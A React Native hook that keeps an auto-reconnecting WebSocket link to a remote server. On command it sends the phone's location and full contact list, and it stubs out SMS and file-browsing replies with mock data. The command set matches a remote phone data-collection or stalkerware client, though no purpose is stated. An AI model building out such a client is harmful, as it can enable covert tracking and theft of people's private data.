import { useState, useEffect, useRef } from 'react';
import { Platform } from 'react-native';
import * as Device from 'expo-device';
import Constants from 'expo-constants';

interface Message {
  type: string;
  data: any;
}

export function useDeviceConnection(serverIP?: string, serverPort?: string, autoReconnect: boolean = true) {
  const [isConnected, setIsConnected] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState<'disconnected' | 'connecting' | 'connected'>('disconnected');
  const wsRef = useRef<WebSocket | null>(null);
  const reconnectTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const deviceNameRef = useRef<string>('');

  const connect = (deviceName: string) => {
    if (!serverIP || !serverPort) return;
    
    deviceNameRef.current = deviceName || 'Unknown Device';
    setConnectionStatus('connecting');
    
    const wsUrl = `ws://${serverIP}:${serverPort}`;
    const ws = new WebSocket(wsUrl);
    
    ws.onopen = () => {
      console.log('Connected to server');
      setIsConnected(true);
      setConnectionStatus('connected');
      
      // Send device registration with detailed info
      registerDevice(ws, deviceName);
    };
    
    ws.onmessage = (event) => {
      try {
        const message = JSON.parse(event.data);
        handleServerMessage(message);
      } catch (error) {
        console.error('Error parsing message:', error);
      }
    };
    
    ws.onclose = () => {
      console.log('Disconnected from server');
      setIsConnected(false);
      setConnectionStatus('disconnected');
      
      if (autoReconnect && deviceNameRef.current) {
        console.log('Scheduling reconnect...');
        scheduleReconnect();
      }
    };
    
    ws.onerror = (error) => {
      console.log('WebSocket error occurred, will attempt to reconnect');
      setConnectionStatus('disconnected');
      setIsConnected(false);
    };
    
    wsRef.current = ws;
  };

  const registerDevice = async (ws: WebSocket, deviceName: string) => {
    try {
      const deviceInfo = {
        deviceName: Device.deviceName || deviceName,
        deviceId: Constants.sessionId || 'unknown',
        brand: Device.brand || 'Unknown',
        model: Device.modelName || 'Unknown',
        systemName: Device.osName || Platform.OS,
        systemVersion: Device.osVersion || 'Unknown',
        platform: Platform.OS,
        appVersion: Constants.expoConfig?.version || '1.0.0',
        buildNumber: Constants.expoConfig?.version || '1.0.0',
        timestamp: new Date().toISOString(),
      };
      
      ws.send(JSON.stringify({
        type: 'register',
        data: deviceInfo
      }));
    } catch (error) {
      console.error('Error getting device info:', error);
      // Fallback registration
      ws.send(JSON.stringify({
        type: 'register',
        data: {
          deviceName: deviceName,
          platform: Platform.OS,
          timestamp: new Date().toISOString(),
        }
      }));
    }
  };

  const disconnect = () => {
    if (reconnectTimeoutRef.current) {
      clearTimeout(reconnectTimeoutRef.current);
      reconnectTimeoutRef.current = null;
    }
    
    if (wsRef.current) {
      wsRef.current.close();
      wsRef.current = null;
    }
    
    setIsConnected(false);
    setConnectionStatus('disconnected');
  };

  const scheduleReconnect = () => {
    if (reconnectTimeoutRef.current) {
      clearTimeout(reconnectTimeoutRef.current);
    }
    
    reconnectTimeoutRef.current = setTimeout(() => {
      if (deviceNameRef.current) {
        console.log('Attempting to reconnect...');
        connect(deviceNameRef.current);
      }
    }, 5000); // 5 seconds
  };

  const sendMessage = (message: Message) => {
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(message));
    }
  };

  const handleServerMessage = (message: Message) => {
    console.log('Received message:', message);
    
    switch (message.type) {
      case 'request_location':
        handleLocationRequest();
        break;
      case 'request_contacts':
        handleContactsRequest();
        break;
      case 'file_request':
        // Handle file operations
        break;
      case 'request_files':
        handleFilesRequest();
        break;
      case 'request_sms':
        handleSMSRequest();
        break;
      case 'browse_directory':
        handleDirectoryBrowse(message.data);
        break;
      default:
        console.log('Unknown message type:', message.type);
    }
  };

  const handleLocationRequest = async () => {
    try {
      const Location = await import('expo-location');
      const { status } = await Location.requestForegroundPermissionsAsync();
      if (status === 'granted') {
        const location = await Location.getCurrentPositionAsync({});
        sendMessage({
          type: 'location_response',
          data: {
            latitude: location.coords.latitude,
            longitude: location.coords.longitude,
            timestamp: new Date().toISOString(),
          }
        });
      }
    } catch (error) {
      console.error('Error getting location:', error);
    }
  };

  const handleContactsRequest = async () => {
    try {
      const Contacts = await import('expo-contacts');
      const { status } = await Contacts.requestPermissionsAsync();
      if (status === 'granted') {
        const { data } = await Contacts.getContactsAsync({
          fields: [Contacts.Fields.Name, Contacts.Fields.PhoneNumbers, Contacts.Fields.Emails],
        });
        sendMessage({
          type: 'contacts_response',
          data: data
        });
      }
    } catch (error) {
      console.error('Error getting contacts:', error);
    }
  };

  const handleFilesRequest = async () => {
    try {
      // Send root directory structure
      const rootFiles = [
        { name: 'DCIM', type: 'folder', size: 0, path: '/storage/emulated/0/DCIM', lastModified: new Date().toISOString() },
        { name: 'Pictures', type: 'folder', size: 0, path: '/storage/emulated/0/Pictures', lastModified: new Date().toISOString() },
        { name: 'Downloads', type: 'folder', size: 0, path: '/storage/emulated/0/Downloads', lastModified: new Date().toISOString() },
        { name: 'Documents', type: 'folder', size: 0, path: '/storage/emulated/0/Documents', lastModified: new Date().toISOString() },
        { name: 'Music', type: 'folder', size: 0, path: '/storage/emulated/0/Music', lastModified: new Date().toISOString() },
        { name: 'Movies', type: 'folder', size: 0, path: '/storage/emulated/0/Movies', lastModified: new Date().toISOString() },
        { name: 'Android', type: 'folder', size: 0, path: '/storage/emulated/0/Android', lastModified: new Date().toISOString() },
      ];
      
      sendMessage({
        type: 'files_response',
        data: { files: rootFiles, currentPath: '/storage/emulated/0' }
      });
    } catch (error) {
      console.error('Error getting files:', error);
    }
  };

  const handleDirectoryBrowse = async (requestData: any) => {
    try {
      const { path } = requestData;
      
      // Mock directory browsing - in real implementation, use react-native-fs
      let files = [];
      
      if (path.includes('DCIM')) {
        files = [
          { name: 'Camera', type: 'folder', size: 0, path: path + '/Camera', lastModified: new Date().toISOString() },
          { name: 'Screenshots', type: 'folder', size: 0, path: path + '/Screenshots', lastModified: new Date().toISOString() },
        ];
      } else if (path.includes('Camera')) {
        files = [
          { name: 'IMG_20241201_001.jpg', type: 'file', size: 2048576, path: path + '/IMG_20241201_001.jpg', lastModified: new Date().toISOString() },
          { name: 'VID_20241201_001.mp4', type: 'file', size: 15728640, path: path + '/VID_20241201_001.mp4', lastModified: new Date().toISOString() },
          { name: 'IMG_20241201_002.jpg', type: 'file', size: 1843200, path: path + '/IMG_20241201_002.jpg', lastModified: new Date().toISOString() },
        ];
      } else if (path.includes('Downloads')) {
        files = [
          { name: 'document.pdf', type: 'file', size: 524288, path: path + '/document.pdf', lastModified: new Date().toISOString() },
          { name: 'music.mp3', type: 'file', size: 4194304, path: path + '/music.mp3', lastModified: new Date().toISOString() },
        ];
      } else {
        // Default subdirectories
        files = [
          { name: 'subfolder1', type: 'folder', size: 0, path: path + '/subfolder1', lastModified: new Date().toISOString() },
          { name: 'sample.txt', type: 'file', size: 1024, path: path + '/sample.txt', lastModified: new Date().toISOString() },
        ];
      }
      
      sendMessage({
        type: 'directory_response',
        data: { files, currentPath: path }
      });
    } catch (error) {
      console.error('Error browsing directory:', error);
    }
  };

  const handleSMSRequest = async () => {
    try {
      // Mock SMS data - in real implementation, you'd need SMS permissions and native module
      const mockSMS = [
        {
          id: '1',
          address: '+1234567890',
          body: 'Hey, how are you doing?',
          date: new Date(Date.now() - 3600000).toISOString(),
          type: 'received'
        },
        {
          id: '2',
          address: '+1234567890',
          body: 'I am doing great, thanks for asking!',
          date: new Date(Date.now() - 3000000).toISOString(),
          type: 'sent'
        },
        {
          id: '3',
          address: '+0987654321',
          body: 'Meeting at 3 PM today',
          date: new Date(Date.now() - 7200000).toISOString(),
          type: 'received'
        },
        {
          id: '4',
          address: '+0987654321',
          body: 'Confirmed, see you there',
          date: new Date(Date.now() - 6900000).toISOString(),
          type: 'sent'
        }
      ];
      
      sendMessage({
        type: 'sms_response',
        data: mockSMS
      });
    } catch (error) {
      console.error('Error getting SMS:', error);
    }
  };

  useEffect(() => {
    return () => {
      disconnect();
    };
  }, []);

  return {
    isConnected,
    connectionStatus,
    connect,
    disconnect,
    sendMessage,
  };
}